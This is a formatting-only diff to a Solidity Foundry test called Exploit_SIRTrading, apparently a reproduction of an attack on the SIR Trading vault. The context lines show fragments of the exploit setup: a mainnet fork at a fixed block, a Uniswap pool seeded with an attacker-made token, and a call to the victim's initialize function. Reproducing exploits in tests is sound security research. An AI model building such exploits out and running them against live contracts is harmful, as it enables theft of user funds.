@@ -39,10 +39,10 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20 {
     IERC20 internal constant wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
     IQuoter internal constant quoter = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);
     address internal constant addressToFind = 0x00000000001271551295307aCC16bA1e7E0d4281; // The address we
-        // want to find
+    // want to find
 
     function setUp() external {
-        cheat.createSelectFork(vm.envString("RPC_URL"), 22157899);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 22_157_899);
 
         addTokenToTracker(address(weth));
         addTokenToTracker(address(usdc));
@@ -75,7 +75,7 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20 {
             address(this),
             100, // Fee tier
             79_228_162_514_264_337_593_543_950_336 // Initial sqrt price (Q64.96 format, corresponds to 1:1
-                // ratio)
+            // ratio)
         );
 
         // Approve the Uniswap pool to spend the debt token
@@ -121,9 +121,7 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20 {
         console.log("===== STEP 3: Initialize Vault =====");
         // Initialize vault
         IVault.VaultParameters memory vaultParams = IVault.VaultParameters({
-            debtToken: address(tokenB),
-            collateralToken: address(this),
-            leverageTier: 0
+            debtToken: address(tokenB), collateralToken: address(this), leverageTier: 0
         });
 
         victim.initialize(vaultParams);
